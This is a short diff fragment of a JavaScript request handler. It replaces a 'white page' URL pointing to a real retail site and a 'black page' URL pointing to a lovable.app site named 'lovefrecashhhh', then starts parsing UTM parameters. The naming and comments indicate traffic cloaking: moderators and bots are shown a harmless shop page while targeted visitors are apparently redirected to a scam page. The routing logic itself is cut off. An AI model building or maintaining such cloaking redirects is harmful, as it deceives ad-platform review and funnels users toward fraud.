@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.firstcry.sa/en/fab-n-funky/playing-home-kitchen-set-interactive-cooking-pretend-play-set-for-kids-includes-mini-utensils-realistic-kitchen-toys-perfect-gift-toy-for-imaginative-play-105x32x104cm-ages-3-pink/12081342/product-detail";
-    const blackPageURL = "https://luvcshap.lovable.app/";
+    const whitePageURL = "https://www.centrepointstores.com/ae/en/c/men-clothing-tshirtsandpolos-tshirts?__cf_chl_rt_tk=vT2R8B_ae_5sv5uCVxEDdi1xlBwmaPpm.31Qc7Tr1YA-1763917034-1.0.1.1-SOdHJMdtEX0zjO0j4oxdcDn6Y0l7RDbxlhv8W5HiXcQ";
+    const blackPageURL = "https://lovefrecashhhh.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
